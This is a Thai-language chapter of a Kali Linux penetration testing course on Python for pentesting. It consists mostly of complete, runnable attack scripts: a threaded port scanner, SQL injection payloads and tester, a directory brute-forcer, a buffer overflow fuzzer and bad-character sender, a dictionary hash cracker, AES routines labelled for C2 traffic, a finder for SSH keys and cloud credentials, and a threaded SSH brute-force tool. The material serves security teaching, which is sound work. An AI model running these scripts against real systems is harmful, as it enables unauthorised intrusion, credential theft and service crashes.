# Part 10: Python for Penetration Testing
## Python สำหรับ Penetration Testing

---

## สารบัญ
1. [Python Basics Review](#basics)
2. [Socket Programming](#sockets)
3. [Port Scanner](#port-scanner)
4. [Banner Grabbing](#banner)
5. [HTTP Requests & Web Scraping](#http)
6. [Exploit Development Basics](#exploits)
7. [Cryptography & Encoding](#crypto)
8. [File Analysis Tools](#files)
9. [ตัวอย่าง Scripts สำเร็จรูป](#complete-scripts)
10. [แบบฝึกหัด](#exercises)

---

## 1. Python Basics Review {#basics}

### ติดตั้งและ Libraries

```bash
# ตรวจสอบ version
python3 --version
pip3 --version

# ติดตั้ง libraries สำหรับ pentest
pip3 install requests beautifulsoup4 paramiko scapy pwntools impacket
pip3 install python-nmap ftplib2 pymongo pymysql
pip3 install colorama tqdm argparse

# Virtual environment
python3 -m venv pentest_env
source pentest_env/bin/activate
pip3 install -r requirements.txt
```

### Python Data Types สำหรับ Pentest

```python
#!/usr/bin/env python3

# Strings - สำหรับ payloads
payload = "' OR 1=1 --"
url = "http://target.com/login"
encoded = payload.encode('utf-8')
hex_payload = payload.encode().hex()

# Lists - targets, ports, passwords
targets = ['192.168.1.1', '192.168.1.2', '10.0.0.1']
ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389]
passwords = [line.strip() for line in open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore')]

# Dictionaries - results mapping
results = {
    '192.168.1.1': {'ports': [80, 443], 'os': 'Linux'},
    '192.168.1.2': {'ports': [22, 3389], 'os': 'Windows'}
}

# Sets - unique values
unique_ports = set([80, 80, 443, 443, 22])
print(unique_ports)  # {80, 443, 22}

# Bytes - สำหรับ raw network data
raw_data = b'\x00\x01\x02\x03\x41\x42\x43'
print(raw_data.hex())
print(raw_data.decode('latin-1'))
```

### File Operations

```python
#!/usr/bin/env python3
import os
import json

# อ่าน wordlist
def load_wordlist(path):
    try:
        with open(path, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] File not found: {path}")
        return []

# บันทึกผลลัพธ์
def save_results(data, output_file):
    with open(output_file, 'w') as f:
        if output_file.endswith('.json'):
            json.dump(data, f, indent=4)
        else:
            for item in data:
                f.write(str(item) + '\n')
    print(f"[+] Saved to: {output_file}")

# เดินหน้า directory
for root, dirs, files in os.walk('/etc'):
    for file in files:
        filepath = os.path.join(root, file)
        print(filepath)

passwords = load_wordlist('/usr/share/wordlists/rockyou.txt')
print(f"[*] Loaded {len(passwords)} passwords")
```

---

## 2. Socket Programming {#sockets}

### TCP Client

```python
#!/usr/bin/env python3
import socket

def tcp_connect(host, port, timeout=3):
    """Connect ไปยัง host:port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        if result == 0:
            return sock
        sock.close()
        return None
    except Exception as e:
        return None

# Banner grabbing
def grab_banner(host, port):
    sock = tcp_connect(host, port)
    if sock:
        try:
            banner = sock.recv(1024)
            return banner.decode('utf-8', errors='ignore').strip()
        except:
            return ""
        finally:
            sock.close()
    return None

# Interactive shell
def interactive_connect(host, port):
    import threading
    import sys
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    print(f"[+] Connected to {host}:{port}")
    
    def receive():
        while True:
            try:
                data = sock.recv(4096)
                if data:
                    sys.stdout.write(data.decode('utf-8', errors='ignore'))
                    sys.stdout.flush()
            except:
                break
    
    t = threading.Thread(target=receive)
    t.daemon = True
    t.start()
    
    try:
        while True:
            cmd = input()
            sock.send((cmd + '\n').encode())
    except KeyboardInterrupt:
        sock.close()

# Test
banner = grab_banner('192.168.1.1', 22)
if banner:
    print(f"[+] SSH Banner: {banner}")
```

### UDP Client

```python
#!/usr/bin/env python3
import socket

def udp_send(host, port, data, timeout=3):
    """Send UDP packet"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(data.encode(), (host, port))
        response, addr = sock.recvfrom(4096)
        return response
    except socket.timeout:
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None
    finally:
        sock.close()

# DNS สอบถาม (simple)
def dns_query(host, dns_server='8.8.8.8'):
    """Simple DNS A record query"""
    # DNS query packet สำหรับ google.com
    # Transaction ID: \x00\x01
    # Flags: \x01\x00 (standard query)
    # Questions: \x00\x01
    # Answer/Auth/Additional: \x00\x00\x00\x00\x00\x00
    header = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    
    # Encode hostname
    question = b''
    for part in host.split('.'):
        question += bytes([len(part)]) + part.encode()
    question += b'\x00'  # End of hostname
    question += b'\x00\x01'  # Type A
    question += b'\x00\x01'  # Class IN
    
    packet = header + question
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    try:
        sock.sendto(packet, (dns_server, 53))
        response, _ = sock.recvfrom(512)
        return response
    except:
        return None
    finally:
        sock.close()
```

---

## 3. Port Scanner {#port-scanner}

### Multi-threaded Port Scanner

```python
#!/usr/bin/env python3
import socket
import threading
import argparse
from datetime import datetime

class PortScanner:
    def __init__(self, target, start_port=1, end_port=1024, threads=100, timeout=1):
        self.target = target
        self.start_port = start_port
        self.end_port = end_port
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.lock = threading.Lock()
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                with self.lock:
                    self.open_ports.append(port)
                # Try to grab banner
                try:
                    sock.send(b'\r\n')
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    if banner:
                        print(f"  [+] Port {port}/tcp OPEN  - {banner[:50]}")
                    else:
                        print(f"  [+] Port {port}/tcp OPEN")
                except:
                    print(f"  [+] Port {port}/tcp OPEN")
            sock.close()
        except socket.error:
            pass
    
    def scan(self):
        print(f"\n[*] Target: {self.target}")
        print(f"[*] Scanning ports {self.start_port}-{self.end_port}")
        print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*50)
        
        start_time = datetime.now()
        
        # Thread pool
        semaphore = threading.Semaphore(self.threads)
        thread_list = []
        
        for port in range(self.start_port, self.end_port + 1):
            semaphore.acquire()
            t = threading.Thread(target=self._scan_with_semaphore, args=(port, semaphore))
            t.start()
            thread_list.append(t)
        
        for t in thread_list:
            t.join()
        
        end_time = datetime.now()
        duration = (end_time - start_time).seconds
        
        print("="*50)
        print(f"\n[+] Scan complete in {duration}s")
        print(f"[+] Open ports: {sorted(self.open_ports)}")
        
        return sorted(self.open_ports)
    
    def _scan_with_semaphore(self, port, semaphore):
        self.scan_port(port)
        semaphore.release()

# Main
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Python Port Scanner')
    parser.add_argument('target', help='Target IP/hostname')
    parser.add_argument('-p', '--ports', default='1-1024', help='Port range (default: 1-1024)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Thread count')
    parser.add_argument('--timeout', type=float, default=1, help='Connection timeout')
    args = parser.parse_args()
    
    start, end = map(int, args.ports.split('-'))
    scanner = PortScanner(args.target, start, end, args.threads, args.timeout)
    open_ports = scanner.scan()
```

### Nmap Python Wrapper

```python
#!/usr/bin/env python3
import nmap  # python-nmap library

def nmap_scan(target, arguments='-sV -sC'):
    """Wrapper สำหรับ nmap"""
    nm = nmap.PortScanner()
    
    print(f"[*] Scanning {target} with arguments: {arguments}")
    nm.scan(hosts=target, arguments=arguments)
    
    results = {}
    for host in nm.all_hosts():
        results[host] = {
            'state': nm[host].state(),
            'hostname': nm[host].hostname(),
            'ports': []
        }
        
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in sorted(ports):
                port_info = nm[host][proto][port]
                if port_info['state'] == 'open':
                    results[host]['ports'].append({
                        'port': port,
                        'protocol': proto,
                        'service': port_info.get('name', ''),
                        'version': port_info.get('version', ''),
                        'product': port_info.get('product', '')
                    })
    
    return results

# ใช้งาน
results = nmap_scan('192.168.1.0/24', '-sn')  # Ping sweep
for host, info in results.items():
    print(f"Host: {host} ({info['hostname']}) - {info['state']}")
    for port in info['ports']:
        print(f"  {port['port']}/{port['protocol']} {port['service']} {port['product']} {port['version']}")
```

---

## 4. Banner Grabbing {#banner}

```python
#!/usr/bin/env python3
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor

SERVICE_PROBES = {
    21:  b'',
    22:  b'',
    23:  b'\r\n',
    25:  b'',
    80:  b'HEAD / HTTP/1.0\r\n\r\n',
    110: b'',
    143: b'',
    443: b'HEAD / HTTP/1.0\r\n\r\n',
    3306: b'',
    3389: b'',
}

def grab_banner(host, port, timeout=3):
    """Grab service banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # SSL wrapper สำหรับ HTTPS
        if port in [443, 8443, 993, 995]:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        # ส่ง probe
        probe = SERVICE_PROBES.get(port, b'\r\n')
        if probe:
            sock.send(probe)
        
        # รับ banner
        banner = sock.recv(1024)
        sock.close()
        
        return banner.decode('utf-8', errors='ignore').strip()
    except Exception:
        return None

def multi_banner_grab(host, ports):
    """Grab banners จาก multiple ports"""
    results = {}
    
    def grab(port):
        banner = grab_banner(host, port)
        if banner:
            results[port] = banner
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(grab, ports)
    
    return results

# ใช้งาน
host = '192.168.1.1'
ports = [21, 22, 25, 80, 110, 143, 443, 3306]
banners = multi_banner_grab(host, ports)

for port, banner in sorted(banners.items()):
    print(f"Port {port}: {banner[:80]}")
```

---

## 5. HTTP Requests & Web Scraping {#http}

### HTTP Client สำหรับ Web Pentest

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings()  # ปิด SSL warnings

class WebClient:
    def __init__(self, target_url, proxy=None):
        self.base_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        
        # Headers ที่ดูเป็นธรรมชาติ
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
    
    def get(self, path='/', params=None):
        url = urljoin(self.base_url, path)
        try:
            r = self.session.get(url, params=params, timeout=10)
            return r
        except Exception as e:
            print(f"[-] GET Error: {e}")
            return None
    
    def post(self, path='/', data=None, json_data=None):
        url = urljoin(self.base_url, path)
        try:
            r = self.session.post(url, data=data, json=json_data, timeout=10)
            return r
        except Exception as e:
            print(f"[-] POST Error: {e}")
            return None
    
    def get_forms(self, path='/'):
        """ดึง HTML forms จากหน้าเว็บ"""
        r = self.get(path)
        if not r:
            return []
        
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', path),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            for inp in form.find_all(['input', 'textarea', 'select']):
                form_data['inputs'].append({
                    'name': inp.get('name', ''),
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value', '')
                })
            
            forms.append(form_data)
        
        return forms
    
    def extract_links(self, path='/'):
        """ดึง links จากหน้าเว็บ"""
        r = self.get(path)
        if not r:
            return []
        
        soup = BeautifulSoup(r.text, 'html.parser')
        links = set()
        
        for tag in soup.find_all(['a', 'link', 'script', 'img']):
            href = tag.get('href') or tag.get('src')
            if href:
                full_url = urljoin(self.base_url, href)
                if urlparse(full_url).netloc == urlparse(self.base_url).netloc:
                    links.add(full_url)
        
        return list(links)

# SQL Injection Tester
class SQLiTester:
    PAYLOADS = [
        "'",
        "'' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "admin'--",
        "') OR ('1'='1",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
    ]
    
    ERROR_PATTERNS = [
        'sql syntax', 'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
        'syntax error', 'mysql error', 'Warning: mysql',
        'PostgreSQL ERROR', 'SQLITE_ERROR'
    ]
    
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.session.verify = False
    
    def test_parameter(self, param, method='GET'):
        """ทดสอบ SQL injection บน parameter"""
        vulnerable = []
        
        for payload in self.PAYLOADS:
            try:
                if method == 'GET':
                    r = self.session.get(self.url, params={param: payload}, timeout=10)
                else:
                    r = self.session.post(self.url, data={param: payload}, timeout=10)
                
                response_text = r.text.lower()
                
                for error in self.ERROR_PATTERNS:
                    if error.lower() in response_text:
                        print(f"[VULN] {param}={payload} -> SQL Error: {error}")
                        vulnerable.append(payload)
                        break
                        
            except Exception as e:
                pass
        
        return vulnerable

# ใช้งาน
client = WebClient('http://testphp.vulnweb.com')
forms = client.get_forms('/login.php')
print(f"[+] Found {len(forms)} forms")
for form in forms:
    print(f"  Action: {form['action']}")
    print(f"  Method: {form['method']}")
    for inp in form['inputs']:
        print(f"    Input: {inp['name']} ({inp['type']})")
```

### Directory Brute Force

```python
#!/usr/bin/env python3
import requests
import threading
from queue import Queue
from datetime import datetime

class DirBuster:
    def __init__(self, url, wordlist, threads=20, extensions=None):
        self.url = url.rstrip('/')
        self.wordlist = wordlist
        self.threads = threads
        self.extensions = extensions or ['']
        self.found = []
        self.queue = Queue()
        self.lock = threading.Lock()
    
    def load_wordlist(self):
        with open(self.wordlist, 'r', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
        
        # สร้าง combinations with extensions
        for word in words:
            for ext in self.extensions:
                if ext:
                    self.queue.put(f"{word}{ext}")
                else:
                    self.queue.put(word)
    
    def worker(self):
        session = requests.Session()
        session.verify = False
        session.headers['User-Agent'] = 'Mozilla/5.0'
        
        while not self.queue.empty():
            try:
                path = self.queue.get(timeout=1)
                url = f"{self.url}/{path}"
                
                r = session.get(url, timeout=5, allow_redirects=False)
                
                if r.status_code not in [404, 400]:
                    with self.lock:
                        result = f"[{r.status_code}] {url}"
                        self.found.append(result)
                        print(result)
                
                self.queue.task_done()
            except Exception:
                pass
    
    def run(self):
        print(f"[*] Target: {self.url}")
        print(f"[*] Wordlist: {self.wordlist}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Extensions: {self.extensions}")
        print(f"[*] Started: {datetime.now()}")
        print("="*60)
        
        self.load_wordlist()
        total = self.queue.qsize()
        print(f"[*] Testing {total} paths")
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        self.queue.join()
        
        print("\n" + "="*60)
        print(f"[+] Found {len(self.found)} paths")
        return self.found

# ใช้งาน
buster = DirBuster(
    url='http://192.168.1.1',
    wordlist='/usr/share/wordlists/dirb/common.txt',
    threads=20,
    extensions=['', '.php', '.html', '.txt', '.bak']
)
results = buster.run()
```

---

## 6. Exploit Development Basics {#exploits}

### Buffer Overflow Fuzzer

```python
#!/usr/bin/env python3
import socket
import time

def fuzz_tcp(host, port, prefix='', suffix='\r\n'):
    """TCP Fuzzer สำหรับหา buffer overflow"""
    buffer_size = 100
    
    while True:
        buffer = prefix + 'A' * buffer_size + suffix
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            print(f"[*] Sending {buffer_size} bytes...")
            sock.send(buffer.encode())
            
            response = sock.recv(1024)
            sock.close()
            
            buffer_size += 100
            time.sleep(1)
            
        except socket.error:
            print(f"[!] Crash likely at {buffer_size} bytes!")
            break

# Pattern Generator
def cyclic_pattern_create(length):
    """สร้าง cyclic pattern สำหรับหา offset"""
    pattern = ''
    for a in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz':
        for b in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz':
            for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz':
                for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz':
                    pattern += a+b+c+d
                    if len(pattern) >= length:
                        return pattern[:length]
    return pattern[:length]

def cyclic_pattern_find(pattern, value):
    """หาตำแหน่งของ value ใน pattern"""
    if isinstance(value, int):
        # แปลง integer เป็น bytes
        import struct
        value = struct.pack('<I', value).decode('latin-1')
    return pattern.find(value)

# Bad Characters Checker
def check_badchars(host, port, offset, prefix='', suffix='\r\n'):
    """ส่ง all bytes เพื่อหา bad characters"""
    # สร้าง all bytes ยกเว้น \x00
    all_chars = bytes(range(1, 256))
    
    padding = b'A' * offset
    eip = b'B' * 4  # EIP placeholder
    payload = padding + eip + all_chars
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.send(prefix.encode() + payload + suffix.encode())
        print(f"[*] Sent {len(payload)} bytes with all chars")
        print("[*] Check debugger for bad characters")
        sock.close()
    except Exception as e:
        print(f"[-] Error: {e}")

# ใช้งาน
# fuzz_tcp('192.168.1.100', 9999)
# pattern = cyclic_pattern_create(1000)
# offset = cyclic_pattern_find(pattern, 0x41346341)  # EIP value จาก debugger
```

---

## 7. Cryptography & Encoding {#crypto}

```python
#!/usr/bin/env python3
import base64
import hashlib
import binascii
from Crypto.Cipher import AES, DES
from Crypto.Util.Padding import pad, unpad

# Encoding/Decoding
def base64_encode(text):
    return base64.b64encode(text.encode()).decode()

def base64_decode(encoded):
    return base64.b64decode(encoded).decode()

def hex_encode(text):
    return text.encode().hex()

def hex_decode(hex_str):
    return bytes.fromhex(hex_str).decode()

def url_encode(text):
    from urllib.parse import quote
    return quote(text)

# Hashing
def hash_text(text, algorithm='md5'):
    """สร้าง hash จาก text"""
    algorithms = {
        'md5': hashlib.md5,
        'sha1': hashlib.sha1,
        'sha256': hashlib.sha256,
        'sha512': hashlib.sha512
    }
    
    h = algorithms.get(algorithm, hashlib.md5)
    return h(text.encode()).hexdigest()

def identify_hash(hash_str):
    """ระบุ hash type จาก length"""
    length = len(hash_str)
    hash_types = {
        32: 'MD5',
        40: 'SHA1',
        56: 'SHA224',
        64: 'SHA256',
        96: 'SHA384',
        128: 'SHA512'
    }
    return hash_types.get(length, 'Unknown')

# Password Cracking (Dictionary)
def crack_hash(target_hash, wordlist_path, algorithm='md5'):
    """Crack hash ด้วย dictionary"""
    print(f"[*] Cracking {algorithm.upper()}: {target_hash}")
    
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue
                
                hashed = hash_text(password, algorithm)
                if hashed == target_hash.lower():
                    print(f"[+] Cracked! Password: {password}")
                    return password
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_path}")
    
    print("[-] Password not found in wordlist")
    return None

# AES Encryption (สำหรับ C2 communications)
def aes_encrypt(plaintext, key):
    """AES-256-CBC Encryption"""
    if len(key) < 32:
        key = key.ljust(32, '0')
    key = key[:32].encode()
    
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    
    import base64
    iv = base64.b64encode(cipher.iv).decode()
    ct = base64.b64encode(ct_bytes).decode()
    return iv, ct

def aes_decrypt(iv, ciphertext, key):
    """AES-256-CBC Decryption"""
    if len(key) < 32:
        key = key.ljust(32, '0')
    key = key[:32].encode()
    
    import base64
    iv = base64.b64decode(iv)
    ct = base64.b64decode(ciphertext)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

# ทดสอบ
print("=== Encoding ===")
text = "Hello, Hacker!"
print(f"Base64: {base64_encode(text)}")
print(f"Hex: {hex_encode(text)}")
print(f"URL: {url_encode(text)}")

print("\n=== Hashing ===")
password = "password123"
for algo in ['md5', 'sha1', 'sha256']:
    print(f"{algo.upper()}: {hash_text(password, algo)}")

hash_type = identify_hash("5f4dcc3b5aa765d61d8327deb882cf99")
print(f"\nHash type: {hash_type}")
```

---

## 8. File Analysis Tools {#files}

```python
#!/usr/bin/env python3
import os
import hashlib
import magic  # python-magic
from datetime import datetime

def analyze_file(filepath):
    """วิเคราะห์ไฟล์"""
    if not os.path.exists(filepath):
        return None
    
    stat = os.stat(filepath)
    
    # Hash
    with open(filepath, 'rb') as f:
        data = f.read()
        md5 = hashlib.md5(data).hexdigest()
        sha256 = hashlib.sha256(data).hexdigest()
    
    # File type
    try:
        file_type = magic.from_file(filepath)
        mime_type = magic.from_file(filepath, mime=True)
    except:
        file_type = 'unknown'
        mime_type = 'unknown'
    
    return {
        'path': filepath,
        'size': stat.st_size,
        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
        'md5': md5,
        'sha256': sha256,
        'type': file_type,
        'mime': mime_type
    }

def find_sensitive_files(directory):
    """ค้นหาไฟล์ที่อาจมีข้อมูลสำคัญ"""
    SENSITIVE_PATTERNS = [
        '.env', 'config.php', 'database.yml', 'settings.py',
        'credentials.xml', '.aws/credentials', '.ssh/id_rsa',
        'backup.sql', '*.bak', 'web.config', 'appsettings.json'
    ]
    
    SENSITIVE_EXTENSIONS = ['.key', '.pem', '.pfx', '.p12', '.jks', '.kdb']
    SENSITIVE_KEYWORDS = ['password', 'passwd', 'secret', 'apikey', 'token', 'credential']
    
    found_files = []
    
    for root, dirs, files in os.walk(directory):
        # ข้าม hidden directories
        dirs[:] = [d for d in dirs if not d.startswith('.')]
        
        for filename in files:
            filepath = os.path.join(root, filename)
            
            # Check by name
            for pattern in SENSITIVE_PATTERNS:
                if pattern.lower() in filename.lower():
                    found_files.append(filepath)
                    break
            
            # Check extension
            _, ext = os.path.splitext(filename)
            if ext.lower() in SENSITIVE_EXTENSIONS:
                found_files.append(filepath)
    
    return found_files

# Strings extractor
def extract_strings(filepath, min_length=4):
    """ดึง printable strings จาก binary file"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    strings = []
    current = ''
    
    for byte in data:
        char = chr(byte)
        if 32 <= byte <= 126:  # printable ASCII
            current += char
        else:
            if len(current) >= min_length:
                strings.append(current)
            current = ''
    
    if len(current) >= min_length:
        strings.append(current)
    
    return strings

# ใช้งาน
info = analyze_file('/etc/passwd')
if info:
    print(f"File: {info['path']}")
    print(f"Size: {info['size']} bytes")
    print(f"MD5: {info['md5']}")
    print(f"SHA256: {info['sha256']}")
    print(f"Type: {info['type']}")
```

---

## 9. Complete Scripts {#complete-scripts}

### SSH Brute Force

```python
#!/usr/bin/env python3
import paramiko
import threading
from queue import Queue
import sys

class SSHBruteForce:
    def __init__(self, host, port=22, threads=10):
        self.host = host
        self.port = port
        self.threads = threads
        self.queue = Queue()
        self.found = False
        self.lock = threading.Lock()
    
    def try_login(self, username, password):
        """ลองล็อกอิน SSH"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                self.host,
                port=self.port,
                username=username,
                password=password,
                timeout=5,
                banner_timeout=5
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False
    
    def worker(self):
        while not self.queue.empty() and not self.found:
            try:
                username, password = self.queue.get(timeout=1)
                
                if self.try_login(username, password):
                    with self.lock:
                        self.found = True
                        print(f"\n[SUCCESS] {username}:{password}")
                else:
                    sys.stdout.write(f"\r[-] Trying {username}:{password}")
                    sys.stdout.flush()
                
                self.queue.task_done()
            except Exception:
                pass
    
    def brute_force(self, users, passwords):
        """เริ่ม brute force"""
        for user in users:
            for password in passwords:
                self.queue.put((user, password))
        
        total = self.queue.qsize()
        print(f"[*] Trying {total} combinations...")
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        self.queue.join()
        
        if not self.found:
            print("\n[-] No valid credentials found")

# ใช้งาน (เฉพาะบนระบบที่ได้รับอนุญาตเท่านั้น)
# bf = SSHBruteForce('192.168.1.100', port=22, threads=5)
# users = ['root', 'admin', 'user']
# passwords = ['password', '123456', 'admin', 'root']
# bf.brute_force(users, passwords)
```

---

## 10. แบบฝึกหัด {#exercises}

### Lab 1: Network Scanner
สร้าง Python script ที่:
1. รับ network CIDR เป็น input (เช่น 192.168.1.0/24)
2. ทำ ping sweep หาา live hosts
3. สำหรับ live hosts ทำ port scan 1-1024
4. Detect service จาก banner
5. Export ผลลัพธ์เป็น JSON

### Lab 2: Web Vulnerability Scanner
สร้าง scanner ที่:
1. Crawl website อัตโนมัติ
2. หา parameters ทั้งหมด
3. ทดสอบ SQL injection
4. ทดสอบ XSS
5. Report ช่องโหว่ที่พบ

### Lab 3: Password Cracker
สร้าง cracker ที่:
1. รับ hash file เป็น input
2. Detect hash type อัตโนมัติ
3. Dictionary attack ด้วย rockyou.txt
4. Rule-based attack (เพิ่ม numbers/symbols)
5. แสดง progress และ estimated time

---

## สรุป

| Library | การใช้งาน |
|---------|----------|
| `socket` | Raw network connections |
| `requests` | HTTP requests |
| `paramiko` | SSH connections |
| `scapy` | Packet manipulation |
| `nmap` | Nmap wrapper |
| `beautifulsoup4` | HTML parsing |
| `pwntools` | Exploit development |
| `hashlib` | Hashing |
| `Crypto` | Encryption/Decryption |

---
*Part 10/100+ | Kali Linux Penetration Testing Course*
